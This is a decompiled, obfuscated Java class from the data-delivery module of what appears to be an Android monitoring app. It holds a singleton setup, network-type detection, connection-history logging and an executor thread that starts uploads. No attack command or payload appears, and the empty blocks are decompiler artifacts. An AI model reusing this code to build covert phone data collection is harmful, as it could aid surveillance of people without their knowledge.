package com.vvt.datadeliverymanager;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import com.vvt.connectionhistorymanager.ConnectionHistoryEntry;
import com.vvt.connectionhistorymanager.ConnectionType;
import com.vvt.connectionhistorymanager.ErrorType;
import com.vvt.connectionhistorymanager.Status;
import com.vvt.datadeliverymanager.a.d;

public class k
  implements com.vvt.datadeliverymanager.a.c
{
  private static final boolean a = a.a;
  private static final boolean b = a.b;
  private static final boolean c = a.d;
  private static final boolean d = a.e;
  private static k e;
  private Context f;
  private com.vvt.phoenix.prot.c g;
  private com.vvt.connectionhistorymanager.a h;
  private com.vvt.license.a i;
  private com.vvt.datadeliverymanager.a.b j;
  private com.vvt.phoneinfo.a k;
  private com.vvt.datadeliverymanager.b.b l;
  private com.vvt.server_address_manager.a m;
  private d n;
  private String o;
  private com.vvt.productinfo.a p;
  private com.vvt.c.c q;
  private m r;
  private boolean s;
  private boolean t = false;
  private h u;
  private com.vvt.datadeliverymanager.a.a v;
  private h w;
  
  private k(j paramj, Context paramContext, String paramString)
  {
    this.f = paramContext;
    this.o = paramString;
    Object localObject = this.f;
    String str = this.o;
    localObject = com.vvt.datadeliverymanager.b.b.a((Context)localObject, str);
    this.l = ((com.vvt.datadeliverymanager.b.b)localObject);
    localObject = paramj.b();
    this.g = ((com.vvt.phoenix.prot.c)localObject);
    localObject = paramj.a();
    this.h = ((com.vvt.connectionhistorymanager.a)localObject);
    localObject = paramj.c();
    this.j = ((com.vvt.datadeliverymanager.a.b)localObject);
    localObject = paramj.d();
    this.n = ((d)localObject);
    localObject = paramj.e();
    this.m = ((com.vvt.server_address_manager.a)localObject);
    localObject = paramj.f();
    this.i = ((com.vvt.license.a)localObject);
    localObject = paramj.g();
    this.k = ((com.vvt.phoneinfo.a)localObject);
    localObject = paramj.h();
    this.p = ((com.vvt.productinfo.a)localObject);
    localObject = paramj.i();
    this.q = ((com.vvt.c.c)localObject);
  }
  
  private ConnectionType a(Context paramContext)
  {
    Object localObject = (ConnectivityManager)paramContext.getSystemService("connectivity");
    int i1 = -1;
    NetworkInfo localNetworkInfo = ((ConnectivityManager)localObject).getActiveNetworkInfo();
    if (localNetworkInfo != null) {
      localObject = ((ConnectivityManager)localObject).getActiveNetworkInfo();
    }
    for (int i2 = ((NetworkInfo)localObject).getType();; i2 = i1)
    {
      if (i2 == 0) {
        localObject = ConnectionType.GPRS;
      }
      for (;;)
      {
        return (ConnectionType)localObject;
        i1 = 1;
        if (i2 == i1) {
          localObject = ConnectionType.WIFI;
        } else {
          localObject = ConnectionType.UNKNOWN;
        }
      }
    }
  }
  
  public static k a(j paramj, Context paramContext, String paramString)
  {
    synchronized (k.class)
    {
      k localk = e;
      if (localk == null)
      {
        localk = new com/vvt/datadeliverymanager/k;
        localk.<init>(paramj, paramContext, paramString);
        e = localk;
      }
      localk = e;
      return localk;
    }
  }
  
  private void a(int paramInt1, Status paramStatus, ErrorType paramErrorType, String paramString, int paramInt2)
  {
    ConnectionHistoryEntry localConnectionHistoryEntry = new com/vvt/connectionhistorymanager/ConnectionHistoryEntry;
    localConnectionHistoryEntry.<init>();
    int i1 = this.u.c().a();
    localConnectionHistoryEntry.setAction(i1);
    Object localObject = this.f;
    localObject = a((Context)localObject);
    localConnectionHistoryEntry.setConnectionType((ConnectionType)localObject);
    ConnectionType localConnectionType = ConnectionType.WIFI;
    if (localObject == localConnectionType)
    {
      localObject = com.vvt.z.a.b(this.f);
      localConnectionHistoryEntry.setAPN((String)localObject);
    }
    for (;;)
    {
      long l1 = System.currentTimeMillis();
      localConnectionHistoryEntry.setDate(l1);
      localConnectionHistoryEntry.setErrorType(paramErrorType);
      localConnectionHistoryEntry.setMessage(paramString);
      localConnectionHistoryEntry.setStatus(paramStatus);
      localConnectionHistoryEntry.setStatusCode(paramInt2);
      this.h.a(localConnectionHistoryEntry);
      return;
      localObject = com.vvt.z.a.a(this.f);
      localConnectionHistoryEntry.setAPN((String)localObject);
    }
  }
  
  private void a(long paramLong1, long paramLong2, com.vvt.datadeliverymanager.a.c paramc)
  {
    boolean bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    p localp = new com/vvt/datadeliverymanager/p;
    localp.<init>(paramLong1, paramLong2, paramc);
    localp.a();
    bool = a;
    if (bool) {}
  }
  
  private void a(boolean paramBoolean)
  {
    this.t = paramBoolean;
  }
  
  private void b(long paramLong)
  {
    try
    {
      boolean bool = a;
      if (bool) {}
      com.vvt.datadeliverymanager.b.b localb = this.l;
      localb.b(paramLong);
      bool = b;
      if (bool) {}
      bool = a();
      if (!bool) {
        b();
      }
      bool = a;
      if (bool) {}
      return;
    }
    finally {}
  }
  
  private void b(boolean paramBoolean)
  {
    this.s = paramBoolean;
  }
  
  public void a(long paramLong)
  {
    boolean bool = a;
    if (bool) {}
    bool = b;
    if (bool) {}
    b(paramLong);
    bool = a;
    if (bool) {}
  }
  
  public boolean a()
  {
    return this.t;
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    bool = a();
    if (!bool)
    {
      bool = b;
      if (bool) {}
      m localm = new com/vvt/datadeliverymanager/m;
      localm.<init>(this, null);
      this.r = localm;
      this.r.setName("ExecutorThread");
      localm = this.r;
      l locall = new com/vvt/datadeliverymanager/l;
      locall.<init>(this);
      localm.setUncaughtExceptionHandler(locall);
      localm = this.r;
      localm.start();
    }
    a(true);
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/datadeliverymanager/k.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */